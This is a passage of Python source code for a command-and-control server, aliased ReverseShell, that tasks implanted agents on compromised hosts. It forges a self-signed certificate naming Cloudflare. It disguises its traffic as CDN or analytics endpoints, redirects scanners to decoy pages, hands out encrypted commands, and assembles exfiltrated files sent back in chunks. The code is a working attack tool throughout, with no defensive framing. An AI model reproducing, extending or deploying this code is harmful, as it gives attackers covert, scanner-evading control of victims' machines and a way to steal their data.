                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption(),
                ))

            self.logger.info("Self-signed TLS cert generated via cryptography lib: %s", cert_path)
            return cert_path, key_path

        except ImportError:
            pass  # cryptography not installed — fall through to openssl

        # ── attempt 2: openssl subprocess ────────────────────────────────
        import subprocess as _sp
        subj = "/CN=cdn.cloudflare.net/O=Cloudflare, Inc./C=US"
        _sp.run(
            [
                "openssl", "req", "-x509",
                "-newkey", "rsa:2048",
                "-keyout",  key_path,
                "-out",     cert_path,
                "-days",    "825",
                "-nodes",
                "-subj",    subj,
            ],
            check=True,
            capture_output=True,
        )
        self.logger.info("Self-signed TLS cert generated via openssl: %s", cert_path)
        return cert_path, key_path

    @staticmethod
    def _build_ssl_context(certfile: str, keyfile: str) -> ssl.SSLContext:
        """
        Build a server-side ``ssl.SSLContext`` from a PEM cert + key pair.

        Security settings
        -----------------
        * Minimum protocol: TLS 1.2 (TLS 1.0/1.1 disabled).
        * Cipher suite ordered to prefer ECDHE forward-secrecy ciphers.
        * Client certificate verification disabled (agents use token auth).
        """
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
        # Prefer ECDHE ciphers for forward secrecy; discard RC4/MD5/EXP
        ctx.set_ciphers(
            "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:"
            "!aNULL:!MD5:!RC4:!EXP:!LOW"
        )
        # Agents authenticate with tokens — no client cert needed
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    # ================================================================
    # Flask application — malleable catch-all router
    # ================================================================

    def _build_flask_app(self) -> Flask:
        """
        Build the Flask WSGI app with a single catch-all route.

        Every request passes through ``_malleable_router`` which
        checks the incoming path and User-Agent against the active
        C2 profile.  Matching requests are dispatched to the correct
        handler.  Non-matching requests receive a 302 redirect to the
        profile's ``decoy_redirect`` URL — making the server look like
        a legitimate CDN or analytics endpoint to passive observers.
        """
        c2 = self   # capture reference for closures — MUST be assigned first

        flask_app = Flask(__name__)
        flask_app.config["SECRET_KEY"] = secrets.token_hex(32)

        # ── ProxyFix: unwrap X-Forwarded-For so request.remote_addr is the
        # ── true agent IP, not the CDN's egress IP.
        # ── x_for=N trusts only the last N hops to prevent header spoofing.
        if c2._proxy_mode:
            flask_app.wsgi_app = ProxyFix(
                flask_app.wsgi_app,
                x_for   = c2._x_for_depth,   # honour X-Forwarded-For
                x_proto = 1,                  # honour X-Forwarded-Proto
                x_host  = 1,                  # honour X-Forwarded-Host
                x_prefix= 0,
            )

        # ── helpers shared by all handlers ──────────────────────────

        def _active_prof() -> Dict[str, Any]:
            return C2_PROFILES.get(c2.active_profile, C2_PROFILES["google_analytics"])

        def _ua_ok(prof: Dict[str, Any]) -> bool:
            """Return True if the incoming User-Agent passes profile regex."""
            ua = request.headers.get("User-Agent", "")
            return bool(prof["ua_regex"].search(ua))

        def _secret_ok() -> bool:
            """Gate 0: Validate the X-C2-Secret injected by our CDN."""
            if not c2._proxy_mode:
                return True  # Pass open if proxy mode is off

            incoming_secret = request.headers.get("X-C2-Secret", "")
            # Constant-time comparison prevents timing-oracle attacks
            return secrets.compare_digest(incoming_secret, c2._proxy_secret or "")

        def _validate_jwt(token: str, expected_conn_id: str) -> bool:
            try:
                payload = jwt.decode(token, flask_app.config["SECRET_KEY"], algorithms=["HS256"])
                return payload.get("conn_id") == expected_conn_id
            except jwt.PyJWTError:
                return False

        def _get_agent_key(secret: str) -> bytes:
            """Derive a 32-byte AES key from the agent's secret."""
            return hashlib.sha256(secret.encode()).digest()

        def _encrypt_data(key: bytes, plaintext: str) -> str:
            """Encrypt using AES-256-GCM."""
            aesgcm = AESGCM(key)
            nonce = os.urandom(12)
            ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
            return base64.b64encode(nonce + ciphertext).decode()

        def _decrypt_data(key: bytes, b64_payload: str) -> Optional[str]:
            """Decrypt using AES-256-GCM."""
            try:
                data = base64.b64decode(b64_payload)
                if len(data) < 28: # 12 nonce + 16 tag + min 0 ciphertext
                    return None
                nonce = data[:12]
                ciphertext = data[12:]
                aesgcm = AESGCM(key)
                return aesgcm.decrypt(nonce, ciphertext, None).decode()
            except Exception:
                return None

        # ── individual business-logic handlers ──────────────────────

        def _handle_register(prof: Dict[str, Any]):
            """Register a new agent and return agent_id + token."""
            data     = request.get_json(silent=True) or {}
            hostname = data.get("hostname", "unknown")
            os_info  = data.get("os_info",  "unknown")
            username = data.get("username", "unknown")
            port     = request.environ.get("REMOTE_PORT", 0)

            # ── true IP resolution ────────────────────────────────────────
            # After ProxyFix runs, request.remote_addr already reflects the
            # real agent IP (unwrapped from X-Forwarded-For).  We prefer it
            # over the IP the agent self-reports in the JSON body to prevent
            # trivial spoofing through the payload field.
            true_ip  = request.remote_addr or "unknown"
            # Keep the agent-reported IP as a secondary hint (useful when the
            # agent has multiple NICs or is behind NAT).
            agent_reported_ip = data.get("ip") or true_ip

            conn_id = str(uuid.uuid4())[:12]
            secret  = secrets.token_hex(16)
            import datetime as _dt
            token = jwt.encode(
                {
                    "conn_id": conn_id,
                    "exp": _dt.datetime.utcnow() + _dt.timedelta(days=7)
                },
                flask_app.config["SECRET_KEY"],
                algorithm="HS256"
            )

            with c2._lock:
                c2.active_connections[conn_id] = {
                    "address":      (true_ip, int(port)),
                    "connected_at": datetime.now(),
                    "last_activity": datetime.now(),
                    "hostname":     hostname,
                    "os_info":      os_info,
                    "username":     username,
                    "agent_id":     conn_id,
                    "secret":       secret,
                    "token":        token,
                    "profile":      c2.active_profile,
                    # Surface both IPs to the dashboard
                    "true_ip":      true_ip,           # from X-Forwarded-For (post-ProxyFix)
                    "reported_ip":  agent_reported_ip, # self-reported by agent in JSON body
                }
                c2._task_queues[conn_id]  = queue.Queue()
                c2._result_store[conn_id] = []

            c2.logger.info(
                "Agent registered: %s  true_ip=%s  reported_ip=%s  host=%s  os=%s  user=%s  profile=%s",
                conn_id, true_ip, agent_reported_ip, hostname, os_info, username, c2.active_profile,
            )
            return jsonify({
                "agent_id": conn_id,
                "token":    token,
                "interval": BEACON_INTERVAL_S,
                "jitter":   c2.jitter_pct,
            })

        def _handle_beacon(prof: Dict[str, Any]):
            """Dispatch the next pending task or return 204."""
            conn_id = request.args.get("aid", "")
            token   = request.args.get("token", "")

            with c2._lock:
                info = c2.active_connections.get(conn_id)
                if not info or not _validate_jwt(token, conn_id):
                    # Looks like a real 404 — nothing suspicious
                    return redirect(prof["decoy_redirect"], 302)
                info["last_activity"] = datetime.now()

                q    = c2._task_queues.get(conn_id)
                task = None
                if q and not q.empty():
                    try:
                        task = q.get_nowait()
                    except queue.Empty:
                        task = None

            if task:
                c2.logger.info(
                    "Task dispatched to %s: [%s] %r (ENCRYPTED)",
                    conn_id, task.get("task_id"), task.get("command"),
                )
                
                # Encrypt the entire task JSON for Tier 4 security
                key = c2._get_agent_key(info["secret"])
                encrypted_task = c2._encrypt_data(key, json.dumps(task))
                return jsonify({"enc": encrypted_task}), 200
            
            return ("", 204)   # idle — agent jitters and retries

        def _handle_result(prof: Dict[str, Any]):
            """Store command output from an agent."""
            data    = request.get_json(silent=True) or {}
            conn_id = data.get("aid", "")
            token   = data.get("token", "")
            enc_payload = data.get("enc", "")

            with c2._lock:
                info = c2.active_connections.get(conn_id)
                if not info or not _validate_jwt(token, conn_id):
                    return redirect(prof["decoy_redirect"], 302)
                
                info["last_activity"] = datetime.now()

                # Decrypt the result if it's encrypted (Tier 4)
                if enc_payload:
                    key = c2._get_agent_key(info["secret"])
                    decrypted = c2._decrypt_data(key, enc_payload)
                    if not decrypted:
                        c2.logger.error("Failed to decrypt result from %s", conn_id)
                        return jsonify({"status": "error", "msg": "decryption failed"}), 400
                    data = json.loads(decrypted)

                entry = {
                    "task_id":     data.get("task_id", ""),
                    "command":     data.get("command", ""),
                    "output":      data.get("output", ""),
                    "received_at": datetime.now().isoformat(),
                }

                # Handle Chunked Data Exfiltration (Tier 5)
                if entry["output"].startswith("CHUNK:"):
                    try:
                        b64_chunk = entry["output"].split(":", 1)[1]
                        raw_chunk = base64.b64decode(b64_chunk)
                        task_id = entry["task_id"]
                        
                        exfil_dir = os.path.join(os.getcwd(), "exfiltrated_files", conn_id)
                        os.makedirs(exfil_dir, exist_ok=True)
                        
                        # Use task_id to group chunks into a temporary file
                        temp_path = os.path.join(exfil_dir, f"partial_{task_id}.tmp")
                        with open(temp_path, "ab") as f:
                            f.write(raw_chunk)
                        
                        return jsonify({"status": "ok"}), 200
                    except Exception as e:
                        c2.logger.error(f"Chunk assembly error from {conn_id}: {e}")
                        return jsonify({"status": "error"}), 500

                elif entry["output"] == "EOF":
                    try:
                        task_id = entry["task_id"]
                        exfil_dir = os.path.join(os.getcwd(), "exfiltrated_files", conn_id)
                        temp_path = os.path.join(exfil_dir, f"partial_{task_id}.tmp")
                        
                        if os.path.exists(temp_path):
                            orig_path = entry["command"]
                            base_name = os.path.basename(orig_path) if orig_path else "unknown"
                            filename = f"{int(time.time())}_{base_name}"
                            final_path = os.path.join(exfil_dir, filename)
                            
                            os.rename(temp_path, final_path)
                            entry["output"] = f"[EXFIL] Chunked transfer complete. Saved {os.path.getsize(final_path)} bytes to: {final_path}"
                            c2.logger.info(f"Chunked exfiltration complete from {conn_id}: {final_path}")
                        else:
                            entry["output"] = "[EXFIL ERROR] EOF received but no partial file found."
                    except Exception as e:
                        entry["output"] = f"[EXFIL ERROR] Finalization failed: {str(e)}"
                        c2.logger.error(f"Exfiltration finalization error: {e}")

                # Handle Legacy Legacy Full-File Exfiltration (FILE_DATA: prefix)
                elif entry["output"].startswith("FILE_DATA:"):
                    try:
                        b64_data = entry["output"].split(":", 1)[1]
                        raw_data = base64.b64decode(b64_data)
                        
                        exfil_dir = os.path.join(os.getcwd(), "exfiltrated_files", conn_id)
                        os.makedirs(exfil_dir, exist_ok=True)
                        
                        orig_path = entry["command"]
                        base_name = os.path.basename(orig_path) if orig_path else "unknown"
                        filename = f"{int(time.time())}_{base_name}"
                        save_path = os.path.join(exfil_dir, filename)
                        
                        with open(save_path, "wb") as f:
                            f.write(raw_data)
                        
                        entry["output"] = f"[EXFIL] Successfully saved {len(raw_data)} bytes to: {save_path}"
                        c2.logger.info(f"File exfiltrated from {conn_id}: {save_path}")
                    except Exception as e:
                        entry["output"] = f"[EXFIL ERROR] Failed to save exfiltrated file: {str(e)}"

                store = c2._result_store.setdefault(conn_id, [])
                store.append(entry)
                if len(store) > MAX_CMD_RESULTS:
                    c2._result_store[conn_id] = store[-MAX_CMD_RESULTS:]

            c2.logger.info(
                "Result from %s task=[%s] len=%d",
                conn_id, entry["task_id"], len(entry["output"]),
            )
            return jsonify({"status": "ok"}), 200

        def _handle_heartbeat(prof: Dict[str, Any]):
            """Lightweight keepalive — just update last_activity."""
            data    = request.get_json(silent=True) or {}
            conn_id = data.get("aid", request.args.get("aid", ""))
            token   = data.get("token", request.args.get("token", ""))

            with c2._lock:
                info = c2.active_connections.get(conn_id)
                if not info or not _validate_jwt(token, conn_id):
                    return redirect(prof["decoy_redirect"], 302)
                info["last_activity"] = datetime.now()

            return jsonify({"status": "alive"}), 200

        # ── catch-all: the single public-facing route ────────────────

        @flask_app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
        @flask_app.route("/<path:path>",              methods=["GET", "POST"])
        def malleable_router(path: str):
            """
            Every request arrives here.  We match the path and
            User-Agent against the active C2 profile and dispatch
            to the right handler, or redirect visitors to the decoy.

            Gate 0 — CDN secret header
            --------------------------
            When proxy mode is active, the first check is whether the
            ``X-C2-Secret`` header is present and correct.  Requests
            that fail this check are redirected to the decoy before any
            path analysis.  This drops direct-IP scanners (Shodan, ZMap)
            that reach the server without going through the CDN, because
            the CDN injects the secret server-side — it never appears in
            traffic on the public internet.
            """
            prof        = _active_prof()
            full_path   = "/" + path
            method      = request.method

            # ── Gate 0: CDN secret header check ──────────────────────────
            # Checked before path matching so that scanners that hit a
            # "valid" path (e.g. /collect) still get the decoy redirect.
            if not _secret_ok():
                c2.logger.warning(
                    "Dropped request: Invalid or missing X-C2-Secret from %s",
                    request.remote_addr,
                )
                return redirect(prof["decoy_redirect"], 302)

            ua_matches  = _ua_ok(prof)

            # ── operator status endpoint (no UA check, internal use) ─
            if full_path == "/_c2/status":
                with c2._lock:
                    count = len(c2.active_connections)
                return jsonify({
                    "status":          "running",
                    "agent_count":     count,
                    "active_profile":  c2.active_profile,
                    "jitter_pct":      c2.jitter_pct,
                    "beacon_interval": BEACON_INTERVAL_S,
                }), 200

            # ── operator pull results (no UA check, internal use) ────
            if full_path == "/_c2/results" and method == "GET":
                conn_id = request.args.get("aid", "")
                with c2._lock:
                    if conn_id not in c2.active_connections:
                        abort(404)
                    results = list(c2._result_store.get(conn_id, []))
                return jsonify(results), 200

            # ── profile path matching ────────────────────────────────
            # Register: must be POST to register_path (UA check is loose
            # here because the agent hasn't adopted a spoofed UA yet on
            # first contact — we allow any UA on register).
            if full_path == prof["register_path"] and method == "POST":
                return _handle_register(prof)

            # All subsequent paths require both path match AND UA match.
            if not ua_matches:
                c2.logger.debug(
                    "UA mismatch on %s — redirecting to decoy", full_path
                )
                return redirect(prof["decoy_redirect"], 302)

            if full_path == prof["beacon_path"] and method == "GET":
                return _handle_beacon(prof)

            if full_path == prof["result_path"] and method == "POST":
                return _handle_result(prof)

            if full_path == prof["heartbeat_path"]:
                return _handle_heartbeat(prof)

            # ── no match → decoy redirect ────────────────────────────
            c2.logger.debug("No route match for %s — redirecting", full_path)
            return redirect(prof["decoy_redirect"], 302)

        return flask_app

    # ================================================================
    # Serve-forever loop (run in daemon thread)
    # ================================================================

    def _serve_forever(self) -> None:
        """Run the WSGIServer handle_request loop until stopped."""
        scheme = "HTTPS" if self._use_ssl else "HTTP"
        self.logger.info("%s beacon server thread started", scheme)
        while self.listening:
            try:
                self._http_server.handle_request()
            except ssl.SSLError as exc:
                # TLS handshake errors (e.g. scanner probing plain-HTTP)
                if self.listening:
                    self.logger.debug("TLS handshake error (ignored): %s", exc)
            except Exception as exc:
                if self.listening:
                    self.logger.error("%s server error: %s", scheme, exc)
        self.logger.info("%s beacon server thread stopped", scheme)


# ---------------------------------------------------------------------------
# Backward-compatible alias — import as ``from .reverse_shell import ReverseShell``
# ---------------------------------------------------------------------------
ReverseShell = BeaconC2Server